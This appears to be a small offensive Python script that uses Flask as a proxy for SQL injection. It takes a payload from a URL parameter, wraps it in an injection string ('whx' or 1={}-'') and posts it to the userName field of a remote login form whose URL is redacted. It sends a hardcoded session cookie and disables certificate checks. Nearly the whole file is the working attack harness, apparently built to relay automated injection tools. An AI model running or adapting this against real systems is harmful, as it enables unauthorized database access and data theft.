# encoding: utf-8
from flask import Flask, request, jsonify
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def remote_login(payload):
    burp_url = "https://xxxxx"
    burp_h = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0"}
    exp = "whx' or 1={}-'".format(payload)  # ' or xxx=xxx or 1=payload-'
    cookies = {"SESSION": "xxxx"}
    print(exp)
    burp_data = {"userName": exp, "trueName": "",
                 "undefined": "", "status": ""}
    resp = requests.post(burp_url, headers=burp_h, data=burp_data, verify=False, cookies=cookies)
    return resp.text


app = Flask(__name__)


@app.route('/')
def login():
    payload = request.args.get("id")
    print(payload)
    response = remote_login(payload)
    return response


if __name__ == '__main__':
    app.run()
